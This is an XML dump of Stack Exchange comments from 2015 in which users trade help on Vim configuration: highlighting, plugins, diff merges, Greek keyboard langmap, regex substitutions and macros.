  <row Id="7131" PostId="4705" Score="0" Text="*&quot;CmdtrolPT&quot;*… I like it ;-)" CreationDate="2015-09-11T19:51:34.750" UserId="54" />
  <row Id="7133" PostId="4712" Score="0" Text="I bet that was once a `syntax on`." CreationDate="2015-09-11T21:42:37.443" UserId="1800" />
  <row Id="7134" PostId="4716" Score="1" Text="You have no composer, but you solved my problem. It is running!!!" CreationDate="2015-09-12T09:49:13.273" UserId="2965" />
  <row Id="7135" PostId="4718" Score="1" Text="Right ! I replace my function creation with `function('&lt;SID&gt;'.l:key)` and it worked :) +1 for the `call()` it will replace my function creation." CreationDate="2015-09-12T12:07:09.510" UserId="1821" />
  <row Id="7136" PostId="4669" Score="0" Text="@zool they both say `xxx cleared` - does that mean the builtin markdown support is not working?" CreationDate="2015-09-12T12:42:51.480" UserId="4446" />
  <row Id="7138" PostId="4669" Score="0" Text="@VanLaser I tried installing pandoc but couldn't get it to work..." CreationDate="2015-09-12T12:47:39.973" UserId="4446" />
  <row Id="7139" PostId="4669" Score="0" Text="@LB7979 I don't think so, no. Doesn't it say cleared by what? `verbose` usually says where an option got last set. If you find out that you can usually fix the issue." CreationDate="2015-09-12T13:38:04.700" UserId="3079" />
  <row Id="7141" PostId="4669" Score="0" Text="@zool It says `Last set from /usr/share/vim/vim74/syntax/html.vim` for both Bold and Italic" CreationDate="2015-09-12T20:37:17.117" UserId="4446" />
  <row Id="7142" PostId="4669" Score="0" Text="@zool No sorry, what I meant to say was just ran the command again and now it says `htmlBold xxx term=bold cterm=Bold gui=bold Last set from /usr/share/vim/vim74/syntax/html.vim` and the same with Italic. Last time I ran it it just said cleared, and nothing about Last set." CreationDate="2015-09-12T20:44:27.513" UserId="4446" />
  <row Id="7143" PostId="4722" Score="0" Text="Sourcing another file between `plug#begin()` and `plug#end()` is pretty simple but on first tests it seems like its working, thanks! Also I'm not sure I understand what you exactly mean on your alternative solution." CreationDate="2015-09-12T23:30:32.540" UserId="1841" />
  <row Id="7144" PostId="4722" Score="0" Text="You're welcome :) Re: alternative, I added an example to the answer." CreationDate="2015-09-12T23:38:21.850" UserId="1800" />
  <row Id="7145" PostId="4722" Score="0" Text="Oh I get your example now but the interesting point with the local file is that my &quot;local&quot; plugins are not synched on github, if I write them directly in the versionned `.vimrc` I'll find them on my other machines (even if they are not sourced)." CreationDate="2015-09-12T23:41:37.593" UserId="1841" />
  <row Id="7146" PostId="4723" Score="0" Text="So you're running the above script from inside Vim? Or outside Vim (ie. as `python thread_test.py`)?" CreationDate="2015-09-13T01:04:35.427" UserId="51" />
  <row Id="7147" PostId="4713" Score="0" Text="Hi, I just did that but the plugins are still there. Is that ok?" CreationDate="2015-09-13T05:08:06.287" UserId="3291" />
  <row Id="7149" PostId="4706" Score="1" Text="You could probably use two `matchgroup`s with the `contains` keyword. See the example before [`:h E849`](http://vimhelp.appspot.com/syntax.txt.html#E849)." CreationDate="2015-09-13T09:20:18.857" UserId="205" />
  <row Id="7150" PostId="4724" Score="0" Text="does this help : http://vim.wikia.com/wiki/Change_statusline_color_to_show_insert_or_normal_mode ?" CreationDate="2015-09-13T13:59:30.827" UserId="1821" />
  <row Id="7151" PostId="4724" Score="0" Text="Somewhat, I now know that the property I am looking for is not `StatusLine` or `StatusLineNC`., which changes the line that says `~/Folder/file.txt` in my example image." CreationDate="2015-09-13T14:23:26.750" UserId="3071" />
  <row Id="7152" PostId="4724" Score="0" Text="This is not a late nineties forum. Check the most helpful answer and mark the question as answered." CreationDate="2015-09-13T15:23:30.250" UserId="54" />
  <row Id="7153" PostId="4726" Score="0" Text="You should report that issue to the maintainer of that colorscheme." CreationDate="2015-09-13T15:24:24.950" UserId="54" />
  <row Id="7154" PostId="4728" Score="1" Text="Can't you first record the macro `b` and then record the macro `a` calling `@b`?" CreationDate="2015-09-13T16:14:27.950" UserId="1841" />
  <row Id="7155" PostId="4728" Score="0" Text="@statox The problem is that `b` has destructive effects, so I can't record it first (unless I want to record it, press `u` a bunch of times, and *then* start recording `a`)." CreationDate="2015-09-13T16:19:37.073" UserId="88" />
  <row Id="7156" PostId="4728" Score="1" Text="I think that it is your best solution. Note that you could also record it in another buffer (`enew`,  recording, `bd`) or directly edit the `b` register by writing in your file the content of your macro and then &quot;recording&quot; it by placing the characters in the register with `&quot;by`." CreationDate="2015-09-13T16:24:26.900" UserId="1841" />
  <row Id="7157" PostId="4269" Score="0" Text="Digraphs are made exactly for this purpose (IMO using snippets is a bit overkill to insert a single character). Why don't you want to use them?" CreationDate="2015-09-13T16:39:44.957" UserId="1841" />
  <row Id="7160" PostId="4723" Score="0" Text="[Over here](http://vi.stackexchange.com/a/2731/51) I've used the `thread` module (`_thread` in Python  3) with success on Linux .. . Perhaps you can try to use that rather than the more high-level `threading`?" CreationDate="2015-09-13T22:26:46.280" UserId="51" />
  <row Id="7161" PostId="4713" Score="0" Text="If you're not using them (I.e. They're not included/referenced on .vimrc) it's safe to delete the folders of those plugins." CreationDate="2015-09-14T00:18:50.213" UserId="4518" />
  <row Id="7162" PostId="4676" Score="0" Text="Excellent answer, is there such a mapping to `Esc` just as `&lt;cr&gt;` to `Enter`? Is there a vim help command that can view all such mappings?" CreationDate="2015-09-14T09:14:23.990" UserId="3085" />
  <row Id="7163" PostId="4676" Score="1" Text="@Zen indeed there is: `&lt;esc&gt;`. (See the first example in [`macro.txt`](http://vimhelp.appspot.com/map.txt.html#macro).)" CreationDate="2015-09-14T09:16:25.343" UserId="205" />
  <row Id="7164" PostId="4722" Score="0" Text="If the plugins are &quot;truly&quot; local (e.g. you are making your own plugins, experimental etc.), you don't need `Plug` (while you can use it) - simply add your path to the `runtimepath` in your local vimrc." CreationDate="2015-09-14T09:43:41.647" UserId="1800" />
  <row Id="7165" PostId="3517" Score="0" Text="taking your screenshot for instance, aligning the line numbers 1-2 and 1-3 to the left." CreationDate="2015-09-14T10:56:37.080" UserId="4426" />
  <row Id="7166" PostId="3517" Score="0" Text="@RafiB. Yes, that's possible, by modifying the source..." CreationDate="2015-09-14T10:58:55.680" UserId="51" />
  <row Id="7167" PostId="4733" Score="0" Text="How do you show the bottom split ? FYW I tried the same without the bottom split and I didn't get any trouble" CreationDate="2015-09-14T12:01:18.220" UserId="1821" />
  <row Id="7168" PostId="4733" Score="0" Text="This is the `diff3` view, so that the middle one is the Common Ancestor, and the bottom one is the Merge Result. I got it with git config, `merge.tool=vimdiff` and `merge.conflictstyle=diff3`." CreationDate="2015-09-14T12:04:21.713" UserId="2141" />
  <row Id="7169" PostId="4733" Score="0" Text="I see, here is a recording of a vimdiff https://asciinema.org/a/26318, it doesn't have the diff3 render but may do what you want." CreationDate="2015-09-14T12:07:51.907" UserId="1821" />
  <row Id="7170" PostId="4733" Score="0" Text="@Nobe4 Thanks for your responses. Seems like running `:diffupdate` after `:diffget ...` solves the issue." CreationDate="2015-09-14T12:25:44.347" UserId="2141" />
  <row Id="7171" PostId="4733" Score="0" Text="n9code: This is strange because AFAIK `:diffupdate` only update the display of the diff, not the text ..." CreationDate="2015-09-14T12:28:28.677" UserId="1821" />
  <row Id="7172" PostId="4733" Score="0" Text="Yes your are right. But in this case I will not need text update. As I can do the following and get desired result: `:diffget LO` -&gt; `:diffgetupdate` -&gt; `:diffget LO` -&gt; `:diffget RE` -&gt; `:diffget LO` ...." CreationDate="2015-09-14T12:31:18.023" UserId="2141" />
  <row Id="7173" PostId="4733" Score="1" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/29120/discussion-between-nobe4-and-n9code)." CreationDate="2015-09-14T12:36:25.420" UserId="1821" />
  <row Id="7174" PostId="4737" Score="1" Text="Thanks! https://github.com/vim/vim/blob/fc53ec1e9aac682a8524698240ed2bb6f7b0e300/src/buffer.c#L1159 says `EMSG(_(&quot;E88: Cannot go before first buffer&quot;));`, inside `if (buf == NULL) /* could not find it */` so it seems to be error handling code in case the wrap around failed somehow." CreationDate="2015-09-14T22:01:04.453" UserId="945" />
  <row Id="7175" PostId="4722" Score="1" Text="You're right for this point. But I didn't expressed myself clearly: I meant if I create a `if` in my `vimrc` which checks if a file exists to install some plugins , the content of this `if` (i.e. The plugins I want only on this machine, i.e. The lines `Plug '. ..' `) will still appear in my `vimrc` which isn't convenient. Anyway I've been testing your first solution for some days and it is exactly what I was looking for so I'm accepting your answer. Thanks again :-)" CreationDate="2015-09-14T22:42:05.277" UserId="1841" />
  <row Id="7176" PostId="4714" Score="0" Text="Forward search with zathura should work out of the box with [vimtex](https://github.com/lervag/vimtex). If you like LaTeX-Box, then you might also like vimtex, as it was originally based off of LaTeX-Box." CreationDate="2015-09-15T07:29:13.757" UserId="21" />
  <row Id="7177" PostId="4739" Score="0" Text="Really good suggestions, In fact I am trying gutentags right now.  But, I am mostly a minimalist, to me a line in .vimrc file is better then a plugin, unless the plugin offers me something that a line cannot do.  I think that plugin is required for larger code bases." CreationDate="2015-09-15T13:40:00.730" UserId="3050" />
  <row Id="7178" PostId="4050" Score="0" Text="Just for completeness (I found it a good answer): http://stackoverflow.com/a/2696143/5000478" CreationDate="2015-09-15T13:51:12.170" UserId="1800" />
  <row Id="7179" PostId="4742" Score="0" Text="Can you explain the regex like pattern `/\&lt;\(\w\+\)\s\+\1\&gt;/` ?" CreationDate="2015-09-15T20:00:20.903" UserId="4547" />
  <row Id="7180" PostId="4742" Score="2" Text="@Cbhihe I hope that this helps:&#xA;`\&lt;\&gt;` - are anchor for match the whole word&#xA;`\(\)` - defines a capture group&#xA;`\w` - word character&#xA;`\+` - 1 or more of the preceding character&#xA;`\s` - white space character&#xA;`\1` - represents the content of the first capture group" CreationDate="2015-09-15T20:41:25.430" UserId="1453" />
  <row Id="7181" PostId="4742" Score="1" Text="This works great. I modified the pattern a bit to `/\c\v&lt;(\w+)\s+\1&gt;/`. `\v` makes it magic, so you don't need all the backslashes, and `\c` makes it non-case sensitive, so that it captures dublicated words where the first is in the beginning of the sentence and capitalized." CreationDate="2015-09-15T20:42:30.020" UserId="3316" />
  <row Id="7182" PostId="4742" Score="0" Text="@Andreas I had both of those in my test matching, but elected to use non magic, case sensitive in the final version." CreationDate="2015-09-15T21:34:19.727" UserId="205" />
  <row Id="7183" PostId="4742" Score="0" Text="@muru Magic is a personal taste I suppose, but why keep case sensitivity?" CreationDate="2015-09-15T21:37:46.200" UserId="3316" />
  <row Id="7184" PostId="4742" Score="0" Text="@Andreas also personal choice. Remember that you can't mark entries this highlighted as good and have the highlighting go away. So, as a starting point, at least, you should be restrictive what you let in. I opted to let in non-alphabetic characters, but retain exact matching." CreationDate="2015-09-15T21:41:38.837" UserId="205" />
  <row Id="7185" PostId="4669" Score="0" Text="In my case, the problem is caused by: `colorscheme default` in my vimrc ... If I remove this it works as expected." CreationDate="2015-09-15T23:37:52.413" UserId="51" />
  <row Id="7186" PostId="4740" Score="1" Text="Additionally, it might be helpful to have Vim automatically execute `:diffget` when you save the file (working copy in this case). This way, when you undo, and then save, the diff will be automatically updated.   For example:   `autocmd BufWritePost * if &amp;diff | diffupdate | endif`" CreationDate="2015-09-16T01:51:33.410" UserId="246" />
  <row Id="7187" PostId="4744" Score="0" Text="I do not know the solution, but I know a plugin that mostly does the same thing: [Goyo](https://github.com/junegunn/goyo.vim). You could investigate the source code and see if you can find a solution there." CreationDate="2015-09-16T06:11:24.420" UserId="21" />
  <row Id="7188" PostId="4745" Score="0" Text="It would make sense if there's a horizontal split (okay I understand vim needs to visually separate the horizontal parts), but not in vertical splits (like in the picture above), it makes no sense to visually separate my buffer window from the cmd line..." CreationDate="2015-09-16T06:32:19.743" UserId="3023" />
  <row Id="7189" PostId="4744" Score="0" Text="Goyo cuts even MORE of my screenspace, you can't set the bottom/top margins to 0, I don't get the point of that plugin why would anybody want less writing space?... but thanks for mentioning it cause it brought up similar plugins like vimroom, checking them out." CreationDate="2015-09-16T06:46:57.023" UserId="3023" />
  <row Id="7190" PostId="4744" Score="0" Text="Wish there was a vim callback when a horizontal split happens, that way I can set laststatus to 1 when it does, and back to 0 when there are no more horizontal splits." CreationDate="2015-09-16T07:36:54.497" UserId="3023" />
  <row Id="7191" PostId="4743" Score="0" Text="@muru: why the edit with a backslash before the # sign in `\#   ^L` for a shell script ? Tx." CreationDate="2015-09-16T07:59:12.753" UserId="4547" />
  <row Id="7192" PostId="4731" Score="0" Text="@romaini No need for derogatory and dismissive language with &quot;silly&quot; and such. The message comes across anyway." CreationDate="2015-09-16T08:00:14.630" UserId="3316" />
  <row Id="7193" PostId="4744" Score="0" Text="And no luck with all the plugins, I tried 4 'distraction free' plugins. I was always able to reproduce the the horizontal split artifact mentioned in the link in my question." CreationDate="2015-09-16T08:01:21.763" UserId="3023" />
  <row Id="7194" PostId="4731" Score="0" Text="&quot;silly&quot; is part of the message." CreationDate="2015-09-16T08:38:14.870" UserId="54" />
  <row Id="7195" PostId="4745" Score="0" Text="yes, i meant horizontal. Anyway, there is no way around it as far as i know" CreationDate="2015-09-16T09:05:16.093" UserId="71" />
  <row Id="7196" PostId="4734" Score="0" Text="I installed those colorschemes, but when I activate them within Vim, it gives many error messages&#xA;&#xA;`Error detected while processing /usr/share/vim/vim74/colors/base16-eighties.vim:&#xA;&#xA;line    4:&#xA;E477: No ! allowed: &lt;!DOCTYPE html&gt;&#xA;&#xA;line    5:&#xA;E488: Trailing characters: &lt;html lang=&#xA;&#xA;line    6:&#xA;E488: Trailing characters:   &lt;head prefix=&#xA;&#xA;line    7:&#xA;E488: Trailing characters:     &lt;meta charset='utf-8'&gt;`&#xA;&#xA;etc. Looks like it actually recognized it's not an html file." CreationDate="2015-09-16T10:22:01.520" UserId="4446" />
  <row Id="7197" PostId="4742" Score="1" Text="@muru: True, there's no ready made way to mark syntax as good in relation to SpellBad highlighting the way you proposed it, although one could dream up some way based on pointer hovering over highlighted areas to actually validate syntax locally. Another clunky option is to apply yr proposed cmd, fix all that need fixing in terms of repeated word instances and then supress highlighting of false positive by `:syntax clear SpellBad`. Not ideal but doable." CreationDate="2015-09-16T10:46:42.323" UserId="4547" />
  <row Id="7198" PostId="4744" Score="0" Text="My point was not that you use Goyo, but that Goyo manages to remove the statusline with no artifacts (as far as I know). And yes, it cuts screenspace, but that is by design: The point of Goyo is to give a non distracting buffer with the desired width and height. Personally, I use this sometimes when I write code and/or prose, and I like it." CreationDate="2015-09-16T10:48:03.707" UserId="21" />
  <row Id="7199" PostId="4743" Score="0" Text="The backslash was already there. All I did was add code formatting, so that the characters you want to show are shown exactly as given." CreationDate="2015-09-16T11:45:01.810" UserId="205" />
  <row Id="7200" PostId="4743" Score="0" Text="@muru: Weird, it did not show in my original rendering, Tx and fixed." CreationDate="2015-09-16T12:51:06.290" UserId="4547" />
  <row Id="7201" PostId="4744" Score="0" Text="those distrationfree plugins make the statusline empty, they can't clear it, because it is not possible to have no statusline." CreationDate="2015-09-16T13:02:36.083" UserId="71" />
  <row Id="7202" PostId="4744" Score="0" Text="Is there any information that you do care about? The status line doesn't seem to be going away, so you might as well use it to show things you do care about if the things already shown aren't relevant." CreationDate="2015-09-16T13:23:29.870" UserId="205" />
  <row Id="7203" PostId="4749" Score="1" Text="I think it's [this issue](http://vi.stackexchange.com/q/3355/51)?" CreationDate="2015-09-16T14:17:03.403" UserId="51" />
  <row Id="7204" PostId="4734" Score="0" Text="LB7979 Well, it looks like you downloaded some HTML file, and not the colorscheme... I don't think this is your problem though, as bold text should always work regardless of colorscheme..." CreationDate="2015-09-16T14:19:09.320" UserId="51" />
  <row Id="7205" PostId="4749" Score="0" Text="Absolutely correct. I guess I will just close this. Thanks!" CreationDate="2015-09-16T14:23:22.340" UserId="1417" />
  <row Id="7206" PostId="4749" Score="0" Text="I've marked this as a duplicate, rather than deleting it. [This makes it easier for other people to find their way to the other question and answer(s)](http://meta.stackexchange.com/a/10844/166789) ;-)" CreationDate="2015-09-16T14:28:03.413" UserId="51" />
  <row Id="7207" PostId="4748" Score="0" Text="What features are you looking for? For those users who have never used `vdebug`?" CreationDate="2015-09-16T14:34:30.077" UserId="205" />
  <row Id="7208" PostId="4744" Score="0" Text="@KarlYngveLervåg all the plugins modify `laststatus` and `fillchars` so I was able to reproduce the artifact mentioned in my other question. @ChristianBrabandt I guess the only way is to modify vim's code then... @muru there's nothing I really care about that much, except the line-number, filename and current % of where I am currently in the file, all of this information I can easily and quickly see by just pressing Ctrl-g so there's no point for them to be always there and me staring at them." CreationDate="2015-09-16T15:14:25.797" UserId="3023" />
  <row Id="7209" PostId="4714" Score="0" Text="@KarlYngveLervåg funnily enough my googling led me to this: https://github.com/lervag/vimtex/issues/118 Tried a bit to get LaTeX-Box to work building on suggestions there, but got bored." CreationDate="2015-09-16T19:58:51.113" UserId="205" />
  <row Id="7210" PostId="4748" Score="0" Text="I am looking for features like setting breakpoints and printing value of variable under cursor. In many ways, clewn and pyclewn are both very good alternatives, except I don't want to have to start the debug session separately from my editing session." CreationDate="2015-09-16T21:11:06.630" UserId="21" />
  <row Id="7211" PostId="4714" Score="0" Text="@muru Yes, I also find this stuff to be quite a hazzle. I am relatively happy with how it works in my plugin right now (although there are still room for many improvements, I guess). If caffeinemachine wants to keep using LaTeX-Box, the issue you've linked to might provide some helpful answers." CreationDate="2015-09-16T21:14:19.700" UserId="21" />
  <row Id="7212" PostId="4750" Score="1" Text="If you have a command that reads a file from stdin and outputs it to stdout, named `addMatchNumbers` that takes as its first argument the regex, you could use vim filters : eg write `:%! addMatchNumbers a`" CreationDate="2015-09-17T12:01:55.720" UserId="1543" />
  <row Id="7213" PostId="4734" Score="0" Text="@Carpetsmoker I think that's exactly the problem. The output of `:verb hi htmlBold` on my machine is this: `ctermfg=3 guifg=#ebcb8b Last set from ~/.vim/bundle/base16-vim/colors/base16-ocean.vim`, so the color gets clearly set by my color scheme. Please compare my output to the one of @LB7979, where `htmlBold xxx term=bold cterm=Bold gui=bold Last set from /usr/share/vim/vim74/syntax/html.vim`. No mention of color highlighting in Vim's  default HTML syntax. The `bold` setting is probably not working either cause bold text rendering is off by default in most terminal emulators." CreationDate="2015-09-17T13:48:51.463" UserId="3079" />
  <row Id="7214" PostId="4734" Score="0" Text="@LB7979 please try giving `:hi htmlBold ctermfg=#ff0000 guifg=#ff0000` and check if bold text in your buffer turns red." CreationDate="2015-09-17T13:52:27.133" UserId="3079" />
  <row Id="7215" PostId="4734" Score="0" Text="@LB7979 Also, you can enable bold text rendering in iTerm2 by checking Preferences &gt; Profiles &gt; Text &gt; Draw bold text in bold font" CreationDate="2015-09-17T13:54:21.800" UserId="3079" />
  <row Id="7216" PostId="4734" Score="0" Text="@LB7979 I have no idea what you did there, but to successfully install a color scheme your best bet is following the installation instruction. Here are the ones for Solarized: https://github.com/altercation/vim-colors-solarized#installation" CreationDate="2015-09-17T14:00:37.463" UserId="3079" />
  <row Id="7217" PostId="4752" Score="0" Text="Thanks ! Yr doc wide substitution cmd `:%s/.../.../` looks good especially because as you point out I can always retain the `#  ^L` in the original code for `:hardcopy` compatibility. I don't think the html snippet included as substitute would work though. Better to define a new class up in the HEAD section of the html doc and invoke it whenever you break pages. -- I was looking for something probably not doable, i.e. to introduce an html snippet from the original vim buffer prior to running `syntax/2html.vim`, not in the new buffer containing the html code. No automation here unfortunately." CreationDate="2015-09-17T20:07:37.570" UserId="4547" />
  <row Id="7219" PostId="4752" Score="0" Text="Indeed - although using the above model you could place &quot;special html snippets&quot; between some markers in Vim comments and look for them afterwards in the html buffer, in order to replace the whole line with one of those special html snippets. E.g. from `&quot; *&lt;p&gt;*` to `&lt;p&gt;`, using a substitution such as: `:%s/^.*&quot;\s*\*\(.*\)\*.*/\1/` (not tested)." CreationDate="2015-09-17T21:39:32.757" UserId="1800" />
  <row Id="7220" PostId="4753" Score="6" Text="You can use `input()` or `getchar()`. However it is probably more normal to use a command instead of a mapping for something that takes a parameter." CreationDate="2015-09-17T22:44:21.733" UserId="778" />
  <row Id="7221" PostId="4751" Score="0" Text="Or just `:%s/pattern\zs/\=Increment()/g`.  Exercise to the astute reader: make `Increment()` reset the counter at the beginning of each line, rather than count occurrences from the beginning of file." CreationDate="2015-09-18T06:47:57.087" UserId="2313" />
  <row Id="7222" PostId="4751" Score="0" Text="Nice :) (To reset counter, I'd rather use `:global` with `let g:i = 0` followed by a similar substitution on current matching line)." CreationDate="2015-09-18T07:41:18.037" UserId="1800" />
  <row Id="7223" PostId="4753" Score="0" Text="I agree with Peter's comment; commands are better suited to the job than mappings." CreationDate="2015-09-18T08:48:42.090" UserId="54" />
  <row Id="7224" PostId="4752" Score="0" Text="Yes, possible, but why further complicate one's life ? Better yet stick with `:%s/^.*&amp;quot;\s*^L.*/&lt;P CLASS=&quot;pgbrk&quot;&gt;/` or  `:%s/^.*#\s*^L.*/&lt;P CLASS=&quot;pgbrk&quot;&gt;/` and write a post processing function in ~/.vimrc or as a script: (i) to insert a new class `P.pgbrk` definition at an appropriate location between &lt;HEAD&gt; and &lt;/HEAD&gt; and (ii) to perform the above substitution, all in the emergent html buffer, i.e. after running `syntax/2html.vim`." CreationDate="2015-09-18T12:50:06.310" UserId="4547" />
  <row Id="7225" PostId="4758" Score="1" Text="I think that mapping is not the good way to go: maybe what you're looking for is the `langmap` option (see [the doc](http://vimdoc.sourceforge.net/htmldoc/options.html#'langmap') which includes an example for greek layout). This option was actually made to help dealing with non latin keyboards like greek or cyrilic. It allows you to define pairs of symbols which will be interpreted normally in insert mode but will be replaced in other modes, maybe this will help you." CreationDate="2015-09-18T17:20:05.427" UserId="1841" />
  <row Id="7226" PostId="4758" Score="0" Text="@statox: Thanks! I tried using the ex. but nothing happened. The help says vim had to be complied with the +langmap option. Is there an easy way to check if it was? I’m using the version that comes with Mac OS." CreationDate="2015-09-18T17:42:30.617" UserId="4505" />
  <row Id="7227" PostId="4758" Score="1" Text="You can use `:echo has('langmap')` if you get a `1` you have it if you get a `0` you don't." CreationDate="2015-09-18T17:44:22.910" UserId="1841" />
  <row Id="7228" PostId="4758" Score="0" Text="@statox: Thanks! I updated with `brew install vim --override-system-vi` and `:echo has &amp;c` now returns 1. ZZ works. The problem with `\lv` &amp;c remains." CreationDate="2015-09-18T19:17:05.143" UserId="4505" />
  <row Id="7230" PostId="4758" Score="0" Text="I don't understand the `:echo has &amp;c` part, I don't see how it is related to `langmap` also once you have vim compiled with `langmap` you have to specify the mappings with `:set langmap=ΑA,ΒB,ΨC [...]` in your vimrc." CreationDate="2015-09-18T20:00:37.810" UserId="1841" />
  <row Id="7231" PostId="4758" Score="0" Text="@statox: Sorry, I just meant what you said (&amp;c = etc). I did `:set langmap …`, and everything is working fine now. My problem with commands such as `\λς` was to do with the latex plugin, not langmap." CreationDate="2015-09-18T21:20:58.063" UserId="4505" />
  <row Id="7232" PostId="4752" Score="0" Text="Yes - I was thinking of a general solution, in which you insert - in Vim comments - *any* html patterns which you want to replace those entire comment lines with, in html - then use a single, generic substitute command after `TOhtml` that deals with all of them at once." CreationDate="2015-09-18T22:00:45.140" UserId="1800" />
  <row Id="7233" PostId="4760" Score="1" Text="Try commenting out your plugin settings plugin by plugin in your vimrc. Do you have any custom `ftplugin` files? Your vimrc has the call to pathogen commented out." CreationDate="2015-09-19T01:48:46.240" UserId="205" />
  <row Id="7234" PostId="4766" Score="0" Text="Yes but it is there on line 4 of .vimrc - **set tabstop=2 shiftwidth=2 expandtab**" CreationDate="2015-09-19T12:06:58.213" UserId="4594" />
  <row Id="7235" PostId="4760" Score="0" Text="I uncommented pathogen, and commented out all the plugin settings, but I still have the problem. I have `ftdetect/z80.vim`; I also tried `vim a.c` while that directory is empty. Also, clearing my `bundle` directory, the problem persists.. How does that differ from `vim --noplugin file.c`?" CreationDate="2015-09-19T12:07:51.083" UserId="4589" />
  <row Id="7236" PostId="4766" Score="0" Text="I am sorry I missed it." CreationDate="2015-09-19T12:08:11.693" UserId="2961" />
  <row Id="7237" PostId="4766" Score="0" Text="np, it is wird. shiftwith should be responsible for autoindent and expandtab should convert tabs to spaces.." CreationDate="2015-09-19T12:11:19.657" UserId="4594" />
  <row Id="7238" PostId="4766" Score="0" Text="crap - it is working now.... I think I didn't source the .vimrc after adding expandtab" CreationDate="2015-09-19T12:14:05.117" UserId="4594" />
  <row Id="7240" PostId="4644" Score="1" Text="Very few IDEs have a terminal emulator with even moderate integration." CreationDate="2015-09-19T13:40:21.160" UserId="578" />
  <row Id="7241" PostId="4764" Score="0" Text="I might be wrong but I think that your answer allows to easily get non-English characters in insert mode while OP's problem was to easily get English characters in other modes than insert mode. I'm not sure your answer adresses the initial problem. Still the idea of function enabling/disabling mappings is quite interesting." CreationDate="2015-09-19T13:49:19.083" UserId="1841" />
  <row Id="7242" PostId="4763" Score="1" Text="See also `:help ''`, `:help 03.10`, `:help jump-motions` and `:help motion.txt`." CreationDate="2015-09-19T14:49:07.163" UserId="2055" />
  <row Id="7243" PostId="4764" Score="0" Text="@statox Well, I might have misunderstood the question, but if the problem is to easily insert non-english characters in insertmode while maintaining normalmode functions, I believe my question at least attemps to address that problem." CreationDate="2015-09-19T15:59:47.443" UserId="3316" />
  <row Id="7244" PostId="4764" Score="0" Text="I'm sorry I didn't meant to be offending: I was pointing out that there was maybe a gap between the question and your answer but of course you attempt to address the problem and as I said I really like the idea of functions enabling and disabling mappings. I really wasn't denying your answer and I'm really sorry of that's what it sounded like." CreationDate="2015-09-19T16:05:41.020" UserId="1841" />
  <row Id="7245" PostId="4764" Score="1" Text="@statox No offense taken. And if you had denied my answer that would all be in good order." CreationDate="2015-09-19T16:24:39.737" UserId="3316" />
  <row Id="7246" PostId="4767" Score="1" Text="Use `&lt;space&gt;` instead of  an actual space." CreationDate="2015-09-19T16:39:49.600" UserId="54" />
  <row Id="7247" PostId="4760" Score="0" Text="Had a similar problem. Disabling clang-complete worked for me." CreationDate="2015-09-19T18:32:22.877" UserId="3354" />
  <row Id="7248" PostId="4767" Score="0" Text="That's a start, but I still get stuck in Visual mode without character replacement." CreationDate="2015-09-19T19:25:23.580" UserId="1132" />
  <row Id="7249" PostId="4767" Score="0" Text="Well, how do you usually get out of visual mode?" CreationDate="2015-09-19T21:00:49.043" UserId="54" />
  <row Id="7250" PostId="4767" Score="0" Text="When I'm in normal mode tying `0v\wr&lt;space&gt;`, the code performs as expected, I never need to escape visual mode as `r&lt;space&gt;` returns me to normal mode. When I add `&lt;esc&gt;` to the end of the `_vimrc` script, I get to operator pending mode.(Half size blinking cursor)." CreationDate="2015-09-19T21:14:15.157" UserId="1132" />
  <row Id="7251" PostId="4762" Score="0" Text="[Strongly related question](http://vi.stackexchange.com/q/2001/1841) if not a duplicate." CreationDate="2015-09-19T21:26:49.117" UserId="1841" />
  <row Id="7252" PostId="4770" Score="0" Text="Take my upvote for the use of repeat in the substitution, that's what I wanted to get to but couldn't remember or find how to do it! :-)" CreationDate="2015-09-19T22:12:15.163" UserId="1841" />
  <row Id="7253" PostId="4767" Score="0" Text="So, you just don't add the `&lt;esc&gt;` and problem was solved, right?" CreationDate="2015-09-19T22:56:54.453" UserId="1800" />
  <row Id="7254" PostId="4767" Score="0" Text="No,  If script ends in `r&lt;space&gt;` then executing the command from normal mode results in being in visual mode with no character replacement ever taking place. If script ends in `r&lt;space&gt;&lt;Esc&gt;` then I end up with a half cursor, which I assume is operator pending mode, still no character substitution ever taking place." CreationDate="2015-09-20T01:42:55.410" UserId="1132" />
  <row Id="7255" PostId="4770" Score="0" Text="ryuichiro, You steered me in the right direction. The error was in using `\w` instead of just `w`. The `h` shifts my cursor to the left one position and won't replace  the one non-word character to the left of my word character. Both of the following work. `nnoremap &lt;leader&gt;!v&lt;S-Right&gt;wr&lt;Space&gt;` and `nnoremap &lt;leader&gt;!vwr&lt;Space&gt;`.  The latter is the original using `w` instead of `\w`." CreationDate="2015-09-20T02:21:31.553" UserId="1132" />
  <row Id="7256" PostId="4772" Score="1" Text="Thanks! This is perhaps a good solution, but it seems to require one to learn a new way of typing (polytonic) Greek, which I suspect is less efficient than that built into MacOS X. Also, after &gt;a, there is a considerable lag before ἀ is produced." CreationDate="2015-09-20T11:45:39.933" UserId="4505" />
  <row Id="7257" PostId="4773" Score="1" Text="`6wD` leaves a space after the last word, but at least the visible text is the way you want it. `6wDx` finishes the job, but then you're at four keystrokes again." CreationDate="2015-09-20T11:51:43.563" UserId="2942" />
  <row Id="7258" PostId="4772" Score="0" Text="Perhaps one could write a script to turn off Greek in the OS whenever leaving insert mode, and to turn it back on when returning, if it was on before." CreationDate="2015-09-20T11:52:26.823" UserId="4505" />
  <row Id="7260" PostId="4773" Score="0" Text="Thanks Peter for the alternative, but indeed this solution leaves me with another keystroke to finish the job. As this scenario is quite common, it would be great to have this job done in one action. Your solution is better than the one in my example though, in most scenarios." CreationDate="2015-09-20T13:03:56.023" UserId="4599" />
  <row Id="7261" PostId="4772" Score="0" Text="Is it really necessary to use polytonic Greek? It seems to me that only right encoding is needed, and then to use built-in MacOS X input. But this is probably just my wrong impression. You can also switch to polytonic Greek keyboard in MacOS X (and learn it, but I guess it is not what you seek :-) About the lag of ἀ, there can be some mapping, try to find out by `:map &gt;a`, and if there is, unmap it by `:unmap &gt;a`. As a non-Greek and non-MacOs user I am already at my wits end. Sorry and good luck!" CreationDate="2015-09-20T13:31:33.080" UserId="2961" />
  <row Id="7263" PostId="4775" Score="0" Text="Well, I'm a bit sad there is no easier way, but you answered my question. Thank you!" CreationDate="2015-09-20T17:36:18.690" UserId="4599" />
  <row Id="7264" PostId="4763" Score="1" Text="One really powerful thing about Ctrl+O and Ctrl+I is that it will even jump between files!" CreationDate="2015-09-20T18:36:00.397" UserId="978" />
  <row Id="7265" PostId="4760" Score="0" Text="@cabellicar123 in this case, the most similar plugin would be YouCompleteMe, I suppose." CreationDate="2015-09-20T18:50:50.720" UserId="205" />
